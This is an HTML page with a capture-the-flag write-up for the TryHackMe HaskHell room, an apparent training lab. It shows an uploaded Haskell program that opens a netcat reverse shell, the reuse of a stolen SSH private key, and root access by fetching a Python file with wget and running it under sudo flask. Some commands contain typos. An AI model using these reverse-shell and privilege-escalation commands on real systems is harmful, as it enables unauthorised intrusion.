<head>
    <link rel="stylesheet" href="style.css">
    <title>ðŸš€haskhellCTFðŸ‘¾</title>
    <style>
        h1 {
            text-align: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }
        
        p {
            text-align: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            font-size: xx-large;
        }
    </style>
    <style type="text/css">
        a:link {
            color: rgb(86, 255, 151);
        }
        
        a:visited {
            color: rgba(40, 233, 114, 0.657)
        }
        
        a:hover {
            color: rgb(150, 250, 103)
        }
        
        a:active {
            color: rgb(54, 246, 144)
        }
        
         ::selection {
            color: rgb(121, 54, 246)
        }
    </style>
</head>


<body>
    <p>
        <a href="loby.html"><img src="/peper/images/logo.png" alt="Lobby" /></a>
    </p>
</body>



<h1 id="tryhackme-haskhell-ctf-writeup-">TryHackMe ðŸš€HaskHellðŸ‘¾ CTF WriteUp!</h1>
<p>Hello everyone, today we gonna see how to solve the <a href="https://www.tryhackme.com/room/haskhell">TryHackMe HaskHell CTF !</a></p>
<p>First let&#39;s do a scan on the Ip !</p>
<p>We will use <a href="https://github.com/6Sixty6/ramp">Ramp</a> to scan this IP for open ports. We can also use nmap but Ramp is way faster than nmap (took 2 seconds with Ramp)</p>
<h2 id="we-found-2-ports-open-">We found 2 ports open !</h2>
<p><img src="https://user-images.githubusercontent.com/88773911/155165883-8ac0e037-b508-4a33-b125-c5a5626f53fa.png" alt="image"></p>
<h3 id="we-can-see-that-on-the-port-22-there-is-a-ssh-service-running-and-on-the-port-5001-there-is-a-http-server-">We can see that on the port 22 there is a ssh service running, and on the port 5001 there is a http server.</h3>
<p>When accessing this http server we are greeted with this page.</p>
<p><img src="https://user-images.githubusercontent.com/88773911/155166165-8ae8fbb7-aefb-4d25-b3c8-6180310cb47c.png" alt="image"></p>
<h2 id="we-can-also-see-a-homerwork-hyperlink-let-s-check-that-out-">We can also see a <strong>homerwork</strong> hyperlink, let&#39;s check that out!</h2>
<p><img src="https://user-images.githubusercontent.com/88773911/155166351-36e91e77-d911-46ef-95bb-be26aa4bad3d.png" alt="image"></p>
<h3 id="we-can-see-another-hyperlink-which-will-lead-to-upload-but-it-will-not-work-">We can see another hyperlink which will lead to /upload/ but it will not work/</h3>
<h3 id="let-s-try-to-do-a-gobuster-directory-search-to-see-if-there-are-any-other-directories-">Let&#39;s try to do a gobuster directory search to see if there are any other directories.</h3>
<p><img src="https://user-images.githubusercontent.com/88773911/155166792-de528afb-b375-46dc-92f6-bc82159153fb.png" alt="image"></p>
<h2 id="we-found-the-directory-submit-">We found the directory <strong>/submit</strong></h2>
<p><img src="https://user-images.githubusercontent.com/88773911/155166870-d4c920e1-f8cf-4ce4-83d3-03fab72579a0.png" alt="image"></p>
<h2 id="the-professor-said-that-the-uploaded-code-will-be-ran-and-compiled-and-all-the-output-will-be-piped-to-uploads-interesting-">The professor said that the uploaded code will be ran and compiled and all the output will be piped to /uploads/. Interesting..</h2>
<h1 id="foothold">FOOTHOLD</h1>
<p>After some hassle, I managed to find an exploit which gave me a reverse shell!</p>
<p>code: </p>
<pre><code><span class="hljs-keyword">module</span> Main <span class="hljs-keyword">where</span>
<span class="hljs-keyword">import</span> System.Process

<span class="hljs-title">main</span> = callCommand <span class="hljs-string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |bash -i 2&gt;&amp;1 | nc YOUR_IP PORT &gt;/tmp/f"</span>
</code></pre><h2 id="set-a-netcat-listener-with-the-command-nc-lvnp-port-">Set a netcat listener with the command <code>nc -lvnp PORT</code></h2>
<p>##Save it as reverse_shell.hs and upload it to the server !</p>
<h2 id="and-we-got-it-our-foothold-">And we got it, our foothold !</h2>
<p><img src="https://user-images.githubusercontent.com/88773911/155168564-1dd48f9d-4474-49ee-b5d0-d7842868c711.png" alt="image"></p>
<h2 id="then-type-python3-c-impoty-pty-pty-spawn-bin-bash-to-stabilize-the-shell-">Then, Type <code>python3 -c &#39;impoty pty;pty.spawn(&quot;/bin/bash&quot;)</code> to stabilize the shell!</h2>
<h2 id="after-some-time-we-found-that-the-user-prof-has-a-ssh-directory-let-s-check-it-out-">After some time, we found that the user <strong>prof</strong> has a .ssh directory, let&#39;s check it out !</h2>
<p><img src="https://user-images.githubusercontent.com/88773911/155168821-d89ec0ed-95e0-42fd-bd69-a8821c523be8.png" alt="image"></p>
<h2 id="let-s-try-to-copy-paste-that-to-our-machine-">Let&#39;s try to copy-paste that to our machine .</h2>
<h2 id="after-you-copied-the-ssh-key-don-t-forget-to-do-chmod-600-rsa_file-to-give-it-permission-otherwise-it-wont-work-">After you copied the ssh key, don&#39;t forget to do <code>chmod 600 rsa_file</code> to give it permission, otherwise it wont work.</h2>
<h2 id="and-we-did-it-we-are-in-the-professor-s-machine-">And we did it, we are in the professor&#39;s machine.</h2>
<p><img src="https://user-images.githubusercontent.com/88773911/155169197-c1e6e71c-6baf-4dba-9518-2b8a57e052e2.png" alt="image"></p>
<h2 id="let-s-now-find-a-way-to-get-root-using-privilege-escalation-techniques-">Let&#39;s now find a way to get root using privilege escalation techniques.</h2>
<h2 id="when-running-sudo-l-we-can-see-that-usr-bin-flask-run-will-run-under-root">When running <code>sudo -l</code> we can see that <strong>/usr/bin/flask run</strong> will run under root</h2>
<h2 id="let-s-find-a-way-to-exploit-it">Let&#39;s find a way to exploit it</h2>
<h2 id="after-some-time-i-found-an-exploit-">After some time, I found an exploit !</h2>
<h2 id="first-you-need-to-create-a-exploit-on-your-local-machine-touch-exploit-py-nano-exploit-py-">First, you need to create a exploit on your local machine <code>touch exploit.py &amp;&amp; nano exploit.py</code></h2>
<h2 id="in-this-exploit-you-will-write-the-following-">In this exploit you will write the following:</h2>
<p><code>import pty;pty.spawn(&quot;/bin/bash&quot;)</code></p>
<h2 id="after-that-save-the-exploit-and-start-a-python-webserver-using-the-command-python3-http-server-1337-">After that, save the exploit and start a python webserver using the command <code>python3 http.server 1337</code></h2>
<h2 id="go-back-on-the-ssh-machine-and-do-the-following-">Go back on the ssh machine and do the following:</h2>
<pre><code>cd /tmp
wget http:<span class="hljs-comment">//yourip:1337/exploit.py </span>
<span class="hljs-keyword">export</span> FLASK_APP=exploit.py
sudo /usr/bin/flask <span class="hljs-built_in">run</span>
</code></pre><h2 id="and-ladies-and-gentlemen-s-we-got-root-">And ladies and gentlemen&#39;s, we got root !</h2>
<h1 id="thanks-for-reading-">Thanks for reading !</h1>
